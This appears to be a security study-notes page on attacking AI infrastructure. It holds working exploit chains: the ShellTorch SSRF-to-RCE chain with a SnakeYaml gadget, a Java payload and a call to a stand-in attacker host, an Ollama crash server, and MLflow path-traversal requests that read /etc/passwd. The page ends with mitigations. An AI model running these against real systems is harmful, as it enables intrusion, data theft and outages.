---
tags: [attack, attack/ai]
module: attacking_ai-application_and_systems
last_updated: 2026-05-12
source_count: 3
---

# Vulnerable AI Systems

System-layer attacks on AI deployments: exposed data stores, model deployment tampering, and CVEs in ML frameworks (TorchServe, MLflow, Ollama).

## Overview

The system layer encompasses everything below the application: deployment infrastructure, model serving frameworks, data storage, and build pipelines. Vulnerabilities here can cascade to full compromise — unauthorized access to model weights, training data exfiltration, or remote code execution on inference servers.

Three attack classes:

| Class | Entry point | Impact |
|-------|------------|--------|
| Excessive data handling / insecure storage | Exposed files, weak access control | PII/credential leakage from LLM logs |
| Model deployment tampering | Broken access control on model files or training data | Weight manipulation, backdoor insertion, data poisoning |
| Vulnerable framework code | Unpatched ML serving/tracking software | DoS, LFI, RCE on inference infrastructure |

---

## Attack Class 1: Excessive Data Handling & Insecure Storage

ML applications log queries, responses, and user inputs for retraining and analytics. If those logs are stored insecurely and the application processes more data than necessary, a single misconfiguration exposes everything.

### Finding Exposed Data Files

Standard web recon applies. Directory brute-force with ML-relevant extensions:

```bash
gobuster dir \
  -u http://TARGET/ \
  -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt \
  -x .db,.txt,.sql,.json,.pkl,.csv,.log
```

**What to look for:**
- `.db` files — SQLite databases containing LLM interaction logs
- `.pkl` / `.pth` files — serialized model artifacts (see [[attack/ai/model_steganography]])
- `.log` files — raw inference logs, may contain user PII
- `.json` / `.csv` files — training data exports, configuration, API keys

### Extracting Sensitive Data from LLM Logs

If an application collects sensitive information through the chat interface (medical conditions, payment details, credentials) and stores it in logs:

```bash
wget http://TARGET/storage.db
cat storage.db  # or: sqlite3 storage.db .dump
```

LLM query tables (`llm_queries`) frequently contain `user_id`, `ip_address`, `query`, and `response` columns. A single exposed dump can contain hundreds of users' conversations including credit card numbers, health data, or credentials entered during chat sessions.

**Why this happens:** Chat applications are often not scoped under the same data handling requirements as dedicated payment or healthcare systems, even when the chat collects equivalent data.

### Data Minimisation Test

During assessment, probe what data the application requests through the chat interface:

```
"Can you help me place an order? What information do you need?"
"Do you need my credit card number? My medical history?"
```

If the LLM requests data that goes beyond what a chat application needs — and particularly if it requests regulated data categories (PCI DSS: payment cards; HIPAA: health data; GDPR: any PII) — document this as excessive data collection regardless of whether a storage vulnerability exists.

---

## Attack Class 2: Model Deployment Tampering

### Direct Tampering — Weight Modification

If broken access control allows uploading a new model version, an attacker can replace model weights directly. Effects range from subtle decision-boundary manipulation (useful for targeted misclassification) to outright malicious behavior injection.

**Vector:** A web endpoint that accepts model file uploads without authentication or authorization. Test:
```bash
# Check for unauthenticated model upload endpoints
curl -X POST http://TARGET/model/upload -F "model=@malicious.pth"
curl -X PUT http://TARGET/models/production -d @modified_weights.bin
```

### Indirect Tampering — Training Data Poisoning via Storage Access

If the application exposes training data storage (FTP, S3 bucket, shared filesystem) without proper access control, an attacker can modify training data to poison the next training run — introducing backdoors, bias, or targeted misclassification. See [[attack/ai/trojan_attacks]] and [[attack/ai/label_flipping]] for the data manipulation techniques once access is obtained.

### ShellTorch — TorchServe RCE Chain (CVE-2023-43654 + CVE-2022-1471)

A real-world example of chained deployment infrastructure vulnerabilities leading to full RCE on an ML serving cluster.

**Three-step exploit chain:**

```
Step 1: Unauthorized management API access
  TorchServe's management API (port 8081) exposed on all interfaces
  No authentication required
  → Confirm: curl http://TARGET:8081/

Step 2: SSRF via /workflows endpoint (CVE-2023-43654)
  No URL validation on the workflow spec URL parameter
  → curl -X POST "http://TARGET:8081/workflows?url=http://ATTACKER:8000/pwn.war"

Step 3: SnakeYaml deserialization → RCE (CVE-2022-1471)
  TorchServe's SnakeYaml library deserializes the spec.yaml from the war file
  Gadget chain loads and executes attacker-controlled Java class
```

**Setup for exploitation:**

```bash
# On attacker machine — forward ports via SSH to the lab
ssh htb-stdnt@TARGET -p PORT \
  -R 8000:127.0.0.1:8000 \    # lab can reach back to us on 8000
  -L 8081:127.0.0.1:8081 \    # we access management API via localhost
  -N

# Create malicious spec.yaml (SnakeYaml gadget — loads Java code from attacker)
cat > spec.yaml << 'EOF'
!!javax.script.ScriptEngineManager
[!!java.net.URLClassLoader
  [[!!java.net.URL ["http://127.0.0.1:8000/"]]]]
EOF

# Create handler.py (required by torch-workflow-archiver)
cat > handler.py << 'EOF'
def initialize(self, context):
    self.model = self.load_model()
EOF

# Build the malicious .war archive
pip3 install torch-workflow-archiver
torch-workflow-archiver --workflow-name pwn --spec-file spec.yaml --handler handler.py
# → produces pwn.war
```

**Java RCE payload (MyScriptEngineFactory.java):**

```java
package exploit;
import javax.script.*;
import java.io.IOException;
import java.util.List;

public class MyScriptEngineFactory implements ScriptEngineFactory {
    public MyScriptEngineFactory() {
        try {
            // Replace with reverse shell command
            Runtime.getRuntime().exec("curl http://127.0.0.1:8000/rce");
        } catch (IOException e) { e.printStackTrace(); }
    }
    // ... implement remaining ScriptEngineFactory interface methods as null returns
}
```

```bash
# Compile (requires Java 17)
javac -source 17 -target 17 MyScriptEngineFactory.java

# Set up required directory structure
mkdir -p META-INF/services/ exploit/
echo 'exploit.MyScriptEngineFactory' > META-INF/services/javax.script.ScriptEngineFactory
mv MyScriptEngineFactory.class exploit/

# Host payload + war file
python3 -m http.server 8000

# Trigger SSRF → deserialization → RCE
curl -X POST "http://127.0.0.1:8081/workflows?url=http://127.0.0.1:8000/pwn.war"
```

Successful exploitation shows `GET /rce` hit in your web server log — replace with reverse shell as needed.

---

## Attack Class 3: Vulnerable Framework Code

### CVE-2025-1975 — Ollama DoS (≤0.5.11)

Array bounds check missing during model manifest download. A malicious manifest server causes Ollama to panic and crash.

```bash
# Malicious Flask server
cat > server.py << 'EOF'
from flask import Flask
app = Flask(__name__)

@app.route("/v2/dos/model/manifests/latest")
def exploit():
    return {"layers": [{}]}   # layers with no size field triggers the panic

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000)
EOF

python3 server.py &

# Trigger: instruct vulnerable Ollama to pull from malicious server
curl -X POST -H 'Content-Type: application/json' \
  -d '{"model": "http://localhost:5000/dos/model", "insecure": true}' \
  http://localhost:11434/api/pull
```

Ollama crashes with `panic: runtime error: slice bounds out of range`.

### CVE-2023-6909 — MLflow LFI via Path Traversal (≤2.7.1)

MLflow's `artifact_location` URL parameter is appended to local file paths without sanitisation. Payload in the URL query string enables arbitrary file read.

```bash
# Install vulnerable version
pip3 install mlflow==2.7.1
mlflow server --host 127.0.0.1 --port 8080

# Step 1: Create experiment with path traversal in artifact_location
curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn", "artifact_location": "http:///?/../../../../../../../../../"}' \
  'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'
# → {"experiment_id": "563025420075628626"}

# Step 2: Create a run
curl -X POST -H 'Content-Type: application/json' \
  -d '{"experiment_id": "563025420075628626"}' \
  'http://127.0.0.1:8080/api/2.0/mlflow/runs/create'
# → note run_id

# Step 3: Register a model pointing to filesystem root
curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn_model"}' \
  'http://127.0.0.1:8080/ajax-api/2.0/mlflow/registered-models/create'

curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn_model", "run_id": "<RUN_ID>", "source": "file:///"}' \
  'http://127.0.0.1:8080/ajax-api/2.0/mlflow/model-versions/create'

# Step 4: Read arbitrary files
curl 'http://127.0.0.1:8080/model-versions/get-artifact?path=etc/passwd&name=pwn_model&version=1'
```

### CVE-2024-1594 — MLflow LFI Bypass (≤2.9.2)

The fix for CVE-2023-6909 checked for `..` in query strings but not URL fragments. Move the traversal payload to the fragment:

```bash
pip3 install mlflow==2.9.2

# Fragment-based bypass (# character)
curl -X POST -H 'Content-Type: application/json' \
  -d '{"name": "pwn2", "artifact_location": "http:///#../../../../../../../../../etc/"}' \
  'http://127.0.0.1:8080/ajax-api/2.0/mlflow/experiments/create'
# Exploitation continues identically to CVE-2023-6909 from here
```

---

## CVE Quick Reference

| CVE | Software | Type | Affected versions | Key detail |
|-----|---------|------|------------------|-----------|
| CVE-2023-43654 | TorchServe | SSRF | ≤0.8.1 | `/workflows?url=` — no URL validation; loads attacker-controlled files |
| CVE-2022-1471 | SnakeYaml (used by TorchServe) | Deserialization RCE | ≤1.31 | `!!javax.script.ScriptEngineManager` gadget chain |
| CVE-2025-1975 | Ollama | DoS | ≤0.5.11 | Array bounds panic via malformed model manifest |
| CVE-2023-6909 | MLflow | LFI | ≤2.7.1 | Path traversal in `artifact_location` query string |
| CVE-2024-1594 | MLflow | LFI (bypass) | ≤2.9.2 | Same path traversal via URL fragment — bypasses query-string fix |

---

## Mitigations

| Threat | Mitigation |
|--------|-----------|
| Exposed storage files | Web server should never serve `.db`, `.pkl`, `.pth` directly; use access-controlled APIs |
| Excessive data collection | Principle of data minimisation; never ask users for regulated data (PCI/HIPAA/GDPR) via chat |
| Model deployment tampering | Authenticated + authorised upload endpoints; model integrity hashes in CI/CD |
| Training data exposure | Access-controlled data stores; mutual TLS on internal data pipelines |
| Framework CVEs | Keep ML serving stacks (`TorchServe`, `MLflow`, `Ollama`) patched; automate CVE scanning on dependencies |
| Management API exposure | Bind management APIs to localhost only; require authentication; firewall ingress |

---

## Related Pages

- [[attack/ai/attacking_ai_systems]] — hub page
- [[attack/ai/insecure_ai_components]] — application-layer vulnerabilities
- [[attack/ai/data_poisoning]] — techniques for when training data access is obtained
- [[attack/ai/model_steganography]] — exploiting serialised model files
- [[labs/htb/attacking_ai_applications_and_systems/model_deployment_tampering]] — ShellTorch RCE lab write-up (CVE-2023-43654 + CVE-2022-1471)

## Sources

- raw/attacking_ai-application_and_systems/attacking_the_system_excessive_data_handling_&_insecure_storage.md
- raw/attacking_ai-application_and_systems/attacking_the_system_model_deployment_tampering.md
- raw/attacking_ai-application_and_systems/attacking_the_system_vulnerable_framework_code.md
